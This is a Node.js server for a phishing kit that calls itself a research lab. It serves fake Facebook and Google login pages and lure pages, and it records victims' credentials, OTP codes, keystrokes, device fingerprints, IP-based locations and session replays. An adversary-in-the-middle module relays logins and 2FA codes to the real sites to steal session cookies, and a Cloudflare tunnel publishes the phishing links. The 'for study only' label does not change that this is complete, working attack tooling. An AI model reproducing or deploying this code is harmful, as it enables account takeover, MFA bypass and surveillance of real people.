/**
 * ============================================================
 *  PHISHING RESEARCH LAB - Server Backend (v3.0)
 *  Mục đích: Nghiên cứu bảo mật - CHỈ DÙNG CHO MỤC ĐÍCH HỌC TẬP
 * ============================================================
 * 
 *  Tính năng v3.0:
 *  1. WebSocket realtime push (thay polling 5s)
 *  2. Session Replay — ghi lại hành vi chuột/scroll/hesitation
 *  3. Anti-Detection Evasion Module
 *  4. Landing pages (trúng thưởng, cảnh báo, giao hàng)
 *  5. 2FA giả + CAPTCHA giả (Facebook/Google)
 *  6. Campaign tracking
 *  7. Tất cả tính năng v2.0
 */

const express = require('express');
const fs = require('fs');
const path = require('path');
const os = require('os');
const http = require('http');
const https = require('https');
const { WebSocketServer } = require('ws');
const { spawn } = require('child_process');
const AiTMEngine = require('./aitm/aitm-engine');

const app = express();
const PORT = 3000;
const aitm = new AiTMEngine();

// ==========================================
//  HTTP + WebSocket Server
// ==========================================
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

// Track connected dashboard clients
const dashboardClients = new Set();

wss.on('connection', (ws, req) => {
    console.log('📡 Dashboard WebSocket connected');
    dashboardClients.add(ws);
    
    ws.on('close', () => {
        dashboardClients.delete(ws);
        console.log('📡 Dashboard WebSocket disconnected');
    });
    
    ws.on('error', () => dashboardClients.delete(ws));
    
    // Gửi trạng thái tunnel ngay khi kết nối
    ws.send(JSON.stringify({ type: 'tunnel', url: tunnelUrl, status: tunnelStatus }));
});

// Broadcast tới tất cả dashboard clients
function broadcast(data) {
    const msg = JSON.stringify(data);
    dashboardClients.forEach(ws => {
        try {
            if (ws.readyState === 1) ws.send(msg);
        } catch(e) {}
    });
}

// Biến lưu tunnel URL
let tunnelUrl = null;
let tunnelStatus = 'starting';

// Middleware
app.use(express.json({ limit: '5mb' }));
app.use(express.urlencoded({ extended: true }));

// File lưu trữ dữ liệu
const DATA_FILE        = path.join(__dirname, 'harvested_data.json');
const KEYLOG_FILE      = path.join(__dirname, 'keylog_data.json');
const FINGERPRINT_FILE = path.join(__dirname, 'fingerprint_data.json');
const SESSION_FILE     = path.join(__dirname, 'session_replay.json');
const CAMPAIGN_FILE    = path.join(__dirname, 'campaigns.json');

// Khởi tạo files nếu chưa có
[DATA_FILE, KEYLOG_FILE, FINGERPRINT_FILE, SESSION_FILE, CAMPAIGN_FILE].forEach(f => {
    if (!fs.existsSync(f)) fs.writeFileSync(f, JSON.stringify([], null, 2));
});

// ==========================================
//  ROUTE: Static files
// ==========================================
app.use('/phishing', express.static(path.join(__dirname, 'public', 'phishing')));
app.use('/landing',  express.static(path.join(__dirname, 'public', 'landing')));
app.use('/dashboard', express.static(path.join(__dirname, 'public', 'dashboard')));

// ==========================================
//  API: Thu hoạch credentials
// ==========================================
app.post('/api/harvest', (req, res) => {
    const { email, password, page_type, otp, session_id, campaign_id } = req.body;

    const entry = {
        id: Date.now(),
        timestamp: new Date().toISOString(),
        page_type: page_type || 'facebook',
        campaign_id: campaign_id || 'default',
        credentials: {
            email: email || '',
            password: password || '',
            otp: otp || null
        },
        metadata: {
            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
            user_agent: req.headers['user-agent'] || '',
            referer: req.headers['referer'] || '',
            accept_language: req.headers['accept-language'] || '',
            platform: extractPlatform(req.headers['user-agent'] || ''),
            screen_info: req.body.screen_info || null,
            session_id: session_id || null
        }
    };

    let data = readJson(DATA_FILE);
    data.push(entry);
    writeJson(DATA_FILE, data);

    // Log
    console.log('\n' + '='.repeat(60));
    console.log('🎣 DỮ LIỆU MỚI THU HOẠCH ĐƯỢC!');
    console.log('='.repeat(60));
    console.log(`⏰ ${entry.timestamp}`);
    console.log(`📄 ${entry.page_type.toUpperCase()} | Campaign: ${entry.campaign_id}`);
    console.log(`📧 Email/SĐT:  ${entry.credentials.email}`);
    console.log(`🔑 Mật khẩu:   ${entry.credentials.password}`);
    if (otp) console.log(`🔐 OTP:        ${otp}`);
    console.log(`📱 ${entry.metadata.platform} | IP: ${entry.metadata.ip}`);
    console.log('='.repeat(60) + '\n');

    // Broadcast WebSocket
    broadcast({ type: 'new_harvest', data: entry });

    res.json({ success: true, redirect: getRedirectUrl(page_type) });
});

// ==========================================
//  API: Keylogger
// ==========================================
app.post('/api/keylog', (req, res) => {
    const { field, value, key, page_type, session_id } = req.body;

    const entry = {
        timestamp: new Date().toISOString(),
        session_id: session_id || 'unknown',
        page_type: page_type || 'facebook',
        field, key,
        current_value: value || '',
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
        platform: extractPlatform(req.headers['user-agent'] || '')
    };

    let data = readJson(KEYLOG_FILE);
    if (data.length > 5000) data = data.slice(-2500);
    data.push(entry);
    writeJson(KEYLOG_FILE, data);

    // Broadcast keylog realtime
    broadcast({ type: 'keylog', data: entry });

    res.json({ ok: true });
});

// ==========================================
//  SERVER-SIDE IP GEOLOCATION
// ==========================================
function lookupIPLocation(ip) {
    return new Promise((resolve) => {
        const isLocal = !ip || ip === '::1' || ip === '127.0.0.1' || ip.startsWith('::ffff:127') || ip.startsWith('192.168') || ip.startsWith('10.');
        
        if (isLocal) {
            // Laptop truy cập qua localhost → lấy public IP của server
            https.get('https://ipapi.co/json/', { timeout: 8000, headers: { 'User-Agent': 'node-fetch/1.0' } }, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    try {
                        const d = JSON.parse(body);
                        if (d.latitude) {
                            resolve({
                                latitude: d.latitude, longitude: d.longitude,
                                accuracy: 'IP (~1-50km)', city: d.city || '',
                                region: d.region || '', country: d.country_name || '',
                                isp: d.org || '', source: 'IP', lookup_by: 'server-self',
                                google_maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
                            });
                        } else resolve(null);
                    } catch(e) { resolve(null); }
                });
            }).on('error', () => resolve(null));
            return;
        }
        // Lấy IPv4 thật nếu có IPv6-mapped
        const cleanIP = ip.replace(/^::ffff:/, '');
        const url = `https://ipapi.co/${cleanIP}/json/`;
        const req = https.get(url, { timeout: 8000, headers: { 'User-Agent': 'node-fetch/1.0' } }, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                try {
                    const d = JSON.parse(body);
                    if (d.latitude) {
                        resolve({
                            latitude: d.latitude,
                            longitude: d.longitude,
                            accuracy: 'IP (~1-50km)',
                            city: d.city || '',
                            region: d.region || '',
                            country: d.country_name || '',
                            isp: d.org || '',
                            source: 'IP',
                            lookup_by: 'server',
                            google_maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
                        });
                    } else {
                        // Fallback: ip-api.com
                        lookupIPFallback(cleanIP).then(resolve);
                    }
                } catch(e) { resolve(null); }
            });
        });
        req.on('error', () => lookupIPFallback(cleanIP).then(resolve));
        req.on('timeout', () => { req.destroy(); resolve(null); });
    });
}

function lookupIPFallback(ip) {
    return new Promise((resolve) => {
        const url = `http://ip-api.com/json/${ip}?fields=lat,lon,city,regionName,country,isp,status`;
        http.get(url, { timeout: 6000 }, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                try {
                    const d = JSON.parse(body);
                    if (d.lat && d.status === 'success') {
                        resolve({
                            latitude: d.lat, longitude: d.lon,
                            accuracy: 'IP (~1-50km)',
                            city: d.city || '', region: d.regionName || '',
                            country: d.country || '', isp: d.isp || '',
                            source: 'IP', lookup_by: 'server',
                            google_maps: `https://www.google.com/maps?q=${d.lat},${d.lon}`
                        });
                    } else resolve(null);
                } catch(e) { resolve(null); }
            });
        }).on('error', () => resolve(null)).on('timeout', () => resolve(null));
    });
}

// ==========================================
//  API: Fingerprint
// ==========================================
app.post('/api/fingerprint', async (req, res) => {
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0].trim()
        || req.connection.remoteAddress
        || req.ip;

    const fingerprint = {
        ...req.body,
        server_ip: clientIP,
        received_at: new Date().toISOString()
    };

    // Nếu client không gửi được location (FB WebView bị chặn)
    // → Server tự lookup IP
    const clientLoc = fingerprint.location || {};
    const hasValidLoc = clientLoc.latitude && !clientLoc.error;
    if (!hasValidLoc) {
        const serverLoc = await lookupIPLocation(clientIP);
        if (serverLoc) {
            fingerprint.location = serverLoc;
            console.log(`🌐 Server IP lookup: ${clientIP} → ${serverLoc.city}, ${serverLoc.country}`);
        }
    }

    let data = readJson(FINGERPRINT_FILE);
    if (data.length > 500) data = data.slice(-250);
    data.push(fingerprint);
    writeJson(FINGERPRINT_FILE, data);

    const dev = fingerprint.device || {};
    const loc = fingerprint.location || {};
    console.log('\n' + '-'.repeat(50));
    console.log('📲 THIẾT BỊ MỚI TRUY CẬP!');
    console.log(`📱 ${dev.device_name || 'N/A'} | ${dev.os || ''} ${dev.os_version || ''}`);
    console.log(`🌍 ${dev.browser || ''} v${dev.browser_version || ''}`);
    if (loc.latitude) console.log(`📍 ${loc.latitude}, ${loc.longitude} | ${loc.city || ''}, ${loc.country || ''} [${loc.lookup_by || loc.source}]`);
    console.log('-'.repeat(50) + '\n');

    broadcast({ type: 'new_fingerprint', data: fingerprint });
    res.json({ ok: true });
});

// ==========================================
//  API: Session Replay — ghi hành vi
// ==========================================
app.post('/api/session-replay', (req, res) => {
    const { session_id, events, page_type, campaign_id } = req.body;
    
    if (!session_id || !events) return res.json({ ok: false });

    let data = readJson(SESSION_FILE);
    
    // Tìm session hiện có hoặc tạo mới
    let sessionEntry = data.find(s => s.session_id === session_id);
    if (!sessionEntry) {
        sessionEntry = {
            session_id,
            page_type: page_type || 'unknown',
            campaign_id: campaign_id || 'default',
            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
            user_agent: req.headers['user-agent'] || '',
            started_at: new Date().toISOString(),
            updated_at: new Date().toISOString(),
            events: []
        };
        data.push(sessionEntry);
    }
    
    sessionEntry.updated_at = new Date().toISOString();
    sessionEntry.events.push(...(Array.isArray(events) ? events : [events]));
    
    // Giới hạn 2000 events/session
    if (sessionEntry.events.length > 2000) {
        sessionEntry.events = sessionEntry.events.slice(-1000);
    }
    
    // Giới hạn 200 sessions
    if (data.length > 200) data = data.slice(-100);
    
    writeJson(SESSION_FILE, data);
    
    // Broadcast
    broadcast({ type: 'session_event', session_id, events });
    
    res.json({ ok: true });
});

// ==========================================
//  API: GET endpoints
// ==========================================
app.get('/api/health', (req, res) => {
    res.json({ status: 'online', service: 'Rank 1 — Phishing Link & AiTM', port: PORT, timestamp: new Date().toISOString() });
});

app.get('/api/fingerprints', (req, res) => {
    const data = readJson(FINGERPRINT_FILE);
    res.json({ total: data.length, entries: data.slice().reverse() });
});

app.get('/api/data', (req, res) => {
    const data = readJson(DATA_FILE);
    res.json({ total: data.length, entries: data.slice().reverse() });
});

app.get('/api/keylog', (req, res) => {
    const data = readJson(KEYLOG_FILE);
    const sessions = {};
    data.forEach(entry => {
        const sid = entry.session_id || 'unknown';
        if (!sessions[sid]) {
            sessions[sid] = {
                session_id: sid,
                page_type: entry.page_type,
                ip: entry.ip,
                platform: entry.platform,
                start_time: entry.timestamp,
                keystrokes: []
            };
        }
        sessions[sid].keystrokes.push({ time: entry.timestamp, field: entry.field, key: entry.key, value: entry.current_value });
        sessions[sid].end_time = entry.timestamp;
    });
    res.json({ total_keystrokes: data.length, sessions: Object.values(sessions).reverse() });
});

app.get('/api/session-replay', (req, res) => {
    const data = readJson(SESSION_FILE);
    res.json({ total: data.length, sessions: data.slice().reverse() });
});

app.get('/api/session-replay/:session_id', (req, res) => {
    const data = readJson(SESSION_FILE);
    const session = data.find(s => s.session_id === req.params.session_id);
    if (!session) return res.status(404).json({ error: 'Not found' });
    res.json(session);
});

app.get('/api/count', (req, res) => {
    const harvest = readJson(DATA_FILE).length;
    const fp = readJson(FINGERPRINT_FILE).length;
    const replay = readJson(SESSION_FILE).length;
    res.json({ harvest, fp, replay, total: harvest + fp });
});

app.get('/api/stats', (req, res) => {
    const data = readJson(DATA_FILE);
    const keylogData = readJson(KEYLOG_FILE);
    
    const stats = {
        total_entries: data.length,
        total_keystrokes: keylogData.length,
        by_platform: {},
        by_page_type: {},
        timeline: {},
        recent_activity: data.slice(-5).reverse()
    };

    data.forEach(entry => {
        const platform = entry.metadata?.platform || 'Unknown';
        stats.by_platform[platform] = (stats.by_platform[platform] || 0) + 1;
        const pageType = entry.page_type || 'unknown';
        stats.by_page_type[pageType] = (stats.by_page_type[pageType] || 0) + 1;
        const date = entry.timestamp.split('T')[0];
        stats.timeline[date] = (stats.timeline[date] || 0) + 1;
    });

    res.json(stats);
});

app.get('/api/tunnel', (req, res) => {
    res.json({
        url: tunnelUrl,
        status: tunnelStatus,
        phishing_links: tunnelUrl ? {
            facebook: `${tunnelUrl}/phishing/facebook.html`,
            google: `${tunnelUrl}/phishing/google.html`,
            bitb_google: `${tunnelUrl}/phishing/bitb-google.html`,
            aitm_facebook: `${tunnelUrl}/phishing/aitm-facebook.html`,
            prize: `${tunnelUrl}/landing/prize.html`,
            security: `${tunnelUrl}/landing/security.html`,
            delivery: `${tunnelUrl}/landing/delivery.html`
        } : null
    });
});

// ==========================================
//  API: AiTM (Adversary-in-the-Middle)
// ==========================================

// Start AiTM login — relay credentials to real site
app.post('/api/aitm/login', async (req, res) => {
    try {
        const { target, email, password, session_id, campaign_id } = req.body;
        if (!email || !password) return res.status(400).json({ status: 'error', message: 'Missing credentials' });

        console.log(`\n🔴 [AiTM] LOGIN REQUEST — ${target} — ${email}`);
        broadcast({ type: 'aitm_event', event: 'login_start', target, email, time: new Date().toISOString() });

        const sessionId = await aitm.createSession(target || 'facebook');
        let result;

        if (target === 'google') {
            result = await aitm.loginGoogle(sessionId, email, password);
        } else {
            result = await aitm.loginFacebook(sessionId, email, password);
        }

        // Also save to regular harvest data
        const harvestData = readJson(DATA_FILE);
        harvestData.push({
            email, password,
            page_type: 'aitm_' + (target || 'facebook'),
            session_id: session_id || sessionId,
            campaign_id: campaign_id || 'aitm',
            aitm_result: result.status,
            aitm_session: sessionId,
            time: new Date().toISOString(),
            ip: req.ip || req.headers['x-forwarded-for']
        });
        writeJson(DATA_FILE, harvestData);

        broadcast({
            type: 'aitm_event',
            event: result.status,
            target, email, sessionId,
            cookies_count: result.cookies_count || 0,
            time: new Date().toISOString()
        });

        res.json(result);
    } catch (error) {
        console.error('[AiTM] Error:', error.message);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Submit 2FA OTP to real site
app.post('/api/aitm/2fa', async (req, res) => {
    try {
        const { sessionId, otp } = req.body;
        if (!sessionId || !otp) return res.status(400).json({ status: 'error', message: 'Missing sessionId or OTP' });

        console.log(`\n🔐 [AiTM] 2FA SUBMIT — Session ${sessionId} — OTP: ${otp}`);
        broadcast({ type: 'aitm_event', event: '2fa_submit', sessionId, time: new Date().toISOString() });

        const result = await aitm.submit2FA(sessionId, otp);

        broadcast({
            type: 'aitm_event',
            event: result.status === 'success' ? '2fa_bypassed' : '2fa_failed',
            sessionId,
            cookies_count: result.cookies_count || 0,
            time: new Date().toISOString()
        });

        res.json(result);
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Get stolen sessions list
app.get('/api/aitm/sessions', (req, res) => {
    res.json(aitm.getStolenSessions());
});

// Get full session with cookies
app.get('/api/aitm/session/:id', (req, res) => {
    const session = aitm.getFullSession(req.params.id);
    if (!session) return res.status(404).json({ error: 'Not found' });
    res.json(session);
});

// Get active session state
app.get('/api/aitm/state/:id', (req, res) => {
    const state = aitm.getSessionState(req.params.id);
    if (!state) return res.status(404).json({ error: 'Not found' });
    res.json(state);
});

// ==========================================
//  API: DELETE endpoints
// ==========================================
app.delete('/api/data', (req, res) => {
    writeJson(DATA_FILE, []);
    writeJson(KEYLOG_FILE, []);
    writeJson(FINGERPRINT_FILE, []);
    writeJson(SESSION_FILE, []);
    console.log('🗑️  Đã xóa toàn bộ dữ liệu.');
    broadcast({ type: 'data_cleared' });
    res.json({ success: true });
});

app.delete('/api/data/:timestamp', (req, res) => {
    let data = readJson(DATA_FILE);
    const before = data.length;
    data = data.filter(e => e.timestamp !== decodeURIComponent(req.params.timestamp));
    writeJson(DATA_FILE, data);
    res.json({ success: true, removed: before - data.length });
});

app.delete('/api/fingerprint/:received_at', (req, res) => {
    let data = readJson(FINGERPRINT_FILE);
    const before = data.length;
    data = data.filter(e => e.received_at !== decodeURIComponent(req.params.received_at));
    writeJson(FINGERPRINT_FILE, data);
    res.json({ success: true, removed: before - data.length });
});

app.delete('/api/session-replay/:session_id', (req, res) => {
    let data = readJson(SESSION_FILE);
    const before = data.length;
    data = data.filter(s => s.session_id !== req.params.session_id);
    writeJson(SESSION_FILE, data);
    res.json({ success: true, removed: before - data.length });
});

// ==========================================
//  TRANG CHỦ
// ==========================================
app.get('/', (req, res) => res.redirect('/dashboard'));

// ==========================================
//  UTILITY FUNCTIONS
// ==========================================
function readJson(file) {
    try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch(e) { return []; }
}
function writeJson(file, data) {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
}
function extractPlatform(ua) {
    if (/iPhone/i.test(ua)) return 'iPhone';
    if (/iPad/i.test(ua)) return 'iPad';
    if (/Android/i.test(ua)) return 'Android';
    if (/Windows Phone/i.test(ua)) return 'Windows Phone';
    if (/Windows/i.test(ua)) return 'Windows PC';
    if (/Macintosh/i.test(ua)) return 'Mac';
    if (/Linux/i.test(ua)) return 'Linux';
    return 'Unknown';
}
function getRedirectUrl(pageType) {
    const redirects = {
        facebook: 'https://www.facebook.com',
        google: 'https://accounts.google.com',
        banking: 'https://www.google.com',
        zalo: 'https://zalo.me',
        momo: 'https://momo.vn'
    };
    return redirects[pageType] || 'https://www.facebook.com';
}
function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) return iface.address;
        }
    }
    return '127.0.0.1';
}

// ==========================================
//  Cloudflare Tunnel
// ==========================================
function startTunnel() {
    console.log('\n  🌐 Đang tạo Cloudflare Tunnel...\n');
    tunnelStatus = 'starting';

    const cf = spawn('npx', ['-y', 'cloudflared', 'tunnel', '--url', `http://localhost:${PORT}`], {
        shell: true,
        stdio: ['ignore', 'pipe', 'pipe']
    });

    const handleOutput = (data) => {
        const output = data.toString();
        const match = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
        if (match && !tunnelUrl) {
            tunnelUrl = match[0];
            tunnelStatus = 'connected';

            console.log('╔' + '═'.repeat(66) + '╗');
            console.log('║' + '   🌍 CLOUDFLARE TUNNEL - SẴN SÀNG!'.padEnd(66) + '║');
            console.log('╠' + '═'.repeat(66) + '╣');
            console.log(`║  📘 Facebook:  ${tunnelUrl}/phishing/facebook.html`.padEnd(67) + '║');
            console.log(`║  📧 Google:    ${tunnelUrl}/phishing/google.html`.padEnd(67) + '║');
            console.log(`║  🪟 BitB:      ${tunnelUrl}/phishing/bitb-google.html`.padEnd(67) + '║');
            console.log(`║  🔴 AiTM FB:   ${tunnelUrl}/phishing/aitm-facebook.html`.padEnd(67) + '║');
            console.log(`║  🎁 Trúng thưởng: ${tunnelUrl}/landing/prize.html`.padEnd(67) + '║');
            console.log(`║  🔒 Cảnh báo:  ${tunnelUrl}/landing/security.html`.padEnd(67) + '║');
            console.log(`║  📦 Giao hàng: ${tunnelUrl}/landing/delivery.html`.padEnd(67) + '║');
            console.log('╚' + '═'.repeat(66) + '╝\n');

            // Notify all dashboard clients
            broadcast({ type: 'tunnel', url: tunnelUrl, status: 'connected' });
        }
    };

    cf.stderr.on('data', handleOutput);
    cf.stdout.on('data', handleOutput);

    cf.on('error', (err) => {
        tunnelStatus = 'failed';
        broadcast({ type: 'tunnel', url: null, status: 'failed' });
        console.log('\n  ❌ Cloudflare Tunnel thất bại:', err.message);
    });

    cf.on('close', (code) => {
        if (code !== 0 && code !== null) {
            tunnelStatus = 'failed';
            broadcast({ type: 'tunnel', url: null, status: 'failed' });
        }
    });
}

// ==========================================
//  Khởi động server
// ==========================================
server.listen(PORT, '0.0.0.0', () => {
    const localIP = getLocalIP();
    console.log('');
    console.log('╔' + '═'.repeat(66) + '╗');
    console.log('║' + '   🔬 PHISHING RESEARCH LAB v3.0'.padEnd(66) + '║');
    console.log('╠' + '═'.repeat(66) + '╣');
    console.log(`║  📊 Dashboard:  http://localhost:${PORT}/dashboard`.padEnd(67) + '║');
    console.log(`║  🌐 Local IP:   http://${localIP}:${PORT}`.padEnd(67) + '║');
    console.log('║' + '   ⚡ WebSocket realtime ENABLED'.padEnd(66) + '║');
    console.log('║' + '   📡 Session Replay ENABLED'.padEnd(66) + '║');
    console.log('║' + '   ⚠️  CHỈ DÙNG CHO MỤC ĐÍCH NGHIÊN CỨU!'.padEnd(66) + '║');
    console.log('╚' + '═'.repeat(66) + '╝\n');

    startTunnel();
});
